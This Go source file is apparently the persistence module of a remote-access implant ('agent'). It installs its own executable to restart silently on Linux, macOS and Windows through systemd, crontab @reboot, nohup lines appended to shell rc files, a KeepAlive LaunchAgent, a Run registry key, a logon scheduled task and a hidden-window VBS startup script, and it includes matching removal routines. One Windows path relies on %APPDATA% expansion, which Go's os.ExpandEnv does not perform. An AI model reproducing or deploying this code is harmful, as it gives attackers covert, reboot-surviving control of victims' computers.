package agent

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// PersistenceManager handles cross-platform persistence mechanisms.
type PersistenceManager struct {
	agentPath string
	args      []string
}

// NewPersistenceManager creates a new persistence manager.
func NewPersistenceManager() *PersistenceManager {
	exe, _ := os.Executable()
	return &PersistenceManager{
		agentPath: exe,
		args:      os.Args[1:],
	}
}

// Install establishes persistence using the best available method.
func (pm *PersistenceManager) Install(name string) ([]string, error) {
	methods := []string{}

	switch runtime.GOOS {
	case "linux":
		m, err := pm.installLinux(name)
		methods = append(methods, m...)
		return methods, err
	case "darwin":
		m, err := pm.installDarwin(name)
		methods = append(methods, m...)
		return methods, err
	case "windows":
		m, err := pm.installWindows(name)
		methods = append(methods, m...)
		return methods, err
	}

	return nil, fmt.Errorf("unsupported OS")
}

func (pm *PersistenceManager) installLinux(name string) ([]string, error) {
	methods := []string{}

	// Method 1: Systemd service
	if err := pm.installSystemd(name); err == nil {
		methods = append(methods, "systemd")
	}

	// Method 2: Crontab
	if err := pm.installCrontab(name); err == nil {
		methods = append(methods, "crontab")
	}

	// Method 3: .bashrc
	if err := pm.installBashrc(name); err == nil {
		methods = append(methods, "bashrc")
	}

	// Method 4: .profile
	if err := pm.installProfile(name); err == nil {
		methods = append(methods, "profile")
	}

	return methods, nil
}

func (pm *PersistenceManager) installSystemd(name string) error {
	serviceContent := fmt.Sprintf(`[Unit]
Description=%s Service
After=network.target

[Service]
Type=simple
ExecStart=%s %s
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
`, name, pm.agentPath, strings.Join(pm.args, " "))

	servicePath := "/etc/systemd/system/" + strings.ToLower(name) + ".service"

	// Try system-wide first
	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err == nil {
		exec.Command("systemctl", "daemon-reload").Run()
		exec.Command("systemctl", "enable", strings.ToLower(name)+".service").Run()
		exec.Command("systemctl", "start", strings.ToLower(name)+".service").Run()
		return nil
	}

	// Try user service
	home := os.Getenv("HOME")
	userServicePath := filepath.Join(home, ".config/systemd/user", strings.ToLower(name)+".service")
	os.MkdirAll(filepath.Dir(userServicePath), 0755)
	if err := os.WriteFile(userServicePath, []byte(serviceContent), 0644); err == nil {
		exec.Command("systemctl", "--user", "daemon-reload").Run()
		exec.Command("systemctl", "--user", "enable", strings.ToLower(name)+".service").Run()
		return nil
	}

	return fmt.Errorf("systemd install failed")
}

func (pm *PersistenceManager) installCrontab(name string) error {
	cronLine := fmt.Sprintf("@reboot %s %s >/dev/null 2>&1", pm.agentPath, strings.Join(pm.args, " "))

	// Get existing crontab
	out, err := exec.Command("crontab", "-l").Output()
	existing := ""
	if err == nil {
		existing = string(out)
	}

	// Check if already installed
	if strings.Contains(existing, pm.agentPath) {
		return nil
	}

	// Add new entry
	newCrontab := existing + "\n" + cronLine + "\n"

	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("bty_cron_%d", time.Now().UnixNano()))
	os.WriteFile(tmpFile, []byte(newCrontab), 0600)
	defer os.Remove(tmpFile)

	return exec.Command("crontab", tmpFile).Run()
}

func (pm *PersistenceManager) installBashrc(name string) error {
	home := os.Getenv("HOME")
	bashrc := filepath.Join(home, ".bashrc")

	line := fmt.Sprintf("\n# %s\nnohup %s %s >/dev/null 2>&1 &\n", name, pm.agentPath, strings.Join(pm.args, " "))

	data, err := os.ReadFile(bashrc)
	if err != nil {
		return err
	}

	if strings.Contains(string(data), pm.agentPath) {
		return nil
	}

	f, err := os.OpenFile(bashrc, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.WriteString(line)
	return err
}

func (pm *PersistenceManager) installProfile(name string) error {
	home := os.Getenv("HOME")
	profile := filepath.Join(home, ".profile")

	line := fmt.Sprintf("\n# %s\nnohup %s %s >/dev/null 2>&1 &\n", name, pm.agentPath, strings.Join(pm.args, " "))

	data, err := os.ReadFile(profile)
	if err != nil {
		return err
	}

	if strings.Contains(string(data), pm.agentPath) {
		return nil
	}

	f, err := os.OpenFile(profile, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.WriteString(line)
	return err
}

func (pm *PersistenceManager) installDarwin(name string) ([]string, error) {
	methods := []string{}

	// LaunchAgent
	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.%s.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
        %s
    </array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
    <key>StandardOutPath</key><string>/dev/null</string>
    <key>StandardErrorPath</key><string>/dev/null</string>
</dict>
</plist>`, name, pm.agentPath, pm.formatArgsForPlist())

	home := os.Getenv("HOME")
	plistPath := filepath.Join(home, "Library/LaunchAgents", fmt.Sprintf("com.%s.agent.plist", name))

	os.MkdirAll(filepath.Dir(plistPath), 0755)
	if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err == nil {
		exec.Command("launchctl", "load", plistPath).Run()
		methods = append(methods, "launchagent")
	}

	// Also add to bashrc/zshrc
	for _, rc := range []string{".bashrc", ".zshrc", ".profile"} {
		rcPath := filepath.Join(home, rc)
		line := fmt.Sprintf("\n# %s\nnohup %s %s >/dev/null 2>&1 &\n", name, pm.agentPath, strings.Join(pm.args, " "))

		if data, err := os.ReadFile(rcPath); err == nil {
			if !strings.Contains(string(data), pm.agentPath) {
				if f, err := os.OpenFile(rcPath, os.O_APPEND|os.O_WRONLY, 0644); err == nil {
					f.WriteString(line)
					f.Close()
					methods = append(methods, rc)
				}
			}
		}
	}

	return methods, nil
}

func (pm *PersistenceManager) formatArgsForPlist() string {
	var args string
	for _, arg := range pm.args {
		args += fmt.Sprintf("        <string>%s</string>\n", arg)
	}
	return args
}

func (pm *PersistenceManager) installWindows(name string) ([]string, error) {
	methods := []string{}

	// Method 1: Registry Run key
	regCmd := fmt.Sprintf(
		`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%s" /t REG_SZ /d "\"%s\" %s" /f`,
		name, pm.agentPath, strings.Join(pm.args, " "),
	)
	if err := exec.Command("cmd", "/c", regCmd).Run(); err == nil {
		methods = append(methods, "registry")
	}

	// Method 2: Scheduled Task
	taskCmd := fmt.Sprintf(
		`schtasks /create /tn "%s" /tr "\"%s\" %s" /sc onlogon /f`,
		name, pm.agentPath, strings.Join(pm.args, " "),
	)
	if err := exec.Command("cmd", "/c", taskCmd).Run(); err == nil {
		methods = append(methods, "scheduled_task")
	}

	// Method 3: Startup folder
	startup := os.ExpandEnv("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
	os.MkdirAll(startup, 0755)
	vbsContent := fmt.Sprintf(
		`Set oShell = CreateObject("WScript.Shell")
oShell.Run """%s"" %s", 0, False
`, pm.agentPath, strings.Join(pm.args, " "))

	vbsPath := filepath.Join(startup, name+".vbs")
	if err := os.WriteFile(vbsPath, []byte(vbsContent), 0644); err == nil {
		methods = append(methods, "startup_folder")
	}

	return methods, nil
}

// Remove removes all persistence mechanisms.
func (pm *PersistenceManager) Remove(name string) error {
	switch runtime.GOOS {
	case "linux":
		return pm.removeLinux(name)
	case "darwin":
		return pm.removeDarwin(name)
	case "windows":
		return pm.removeWindows(name)
	}
	return fmt.Errorf("unsupported OS")
}

func (pm *PersistenceManager) removeLinux(name string) error {
	// Remove systemd
	exec.Command("systemctl", "disable", strings.ToLower(name)+".service").Run()
	exec.Command("systemctl", "stop", strings.ToLower(name)+".service").Run()
	os.Remove("/etc/systemd/system/" + strings.ToLower(name) + ".service")

	// Remove from crontab
	out, _ := exec.Command("crontab", "-l").Output()
	lines := strings.Split(string(out), "\n")
	var newLines []string
	for _, line := range lines {
		if !strings.Contains(line, pm.agentPath) {
			newLines = append(newLines, line)
		}
	}
	tmpFile := filepath.Join(os.TempDir(), "bty_cron_remove")
	os.WriteFile(tmpFile, []byte(strings.Join(newLines, "\n")), 0600)
	exec.Command("crontab", tmpFile).Run()
	os.Remove(tmpFile)

	// Remove from bashrc/profile
	for _, rc := range []string{".bashrc", ".profile", ".zshrc"} {
		path := filepath.Join(os.Getenv("HOME"), rc)
		if data, err := os.ReadFile(path); err == nil {
			lines := strings.Split(string(data), "\n")
			var newLines []string
			skip := false
			for _, line := range lines {
				if strings.Contains(line, "# "+name) {
					skip = true
					continue
				}
				if skip && strings.Contains(line, pm.agentPath) {
					skip = false
					continue
				}
				newLines = append(newLines, line)
			}
			os.WriteFile(path, []byte(strings.Join(newLines, "\n")), 0644)
		}
	}

	return nil
}

func (pm *PersistenceManager) removeDarwin(name string) error {
	plistPath := filepath.Join(os.Getenv("HOME"), "Library/LaunchAgents", fmt.Sprintf("com.%s.agent.plist", name))
	exec.Command("launchctl", "unload", plistPath).Run()
	os.Remove(plistPath)
	return nil
}

func (pm *PersistenceManager) removeWindows(name string) error {
	// Remove registry
	exec.Command("cmd", "/c", fmt.Sprintf(`reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%s" /f`, name)).Run()

	// Remove scheduled task
	exec.Command("cmd", "/c", fmt.Sprintf(`schtasks /delete /tn "%s" /f`, name)).Run()

	// Remove startup file
	startup := os.ExpandEnv("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
	os.Remove(filepath.Join(startup, name+".vbs"))

	return nil
}

// Ensure json imported
var _ = json.Marshal
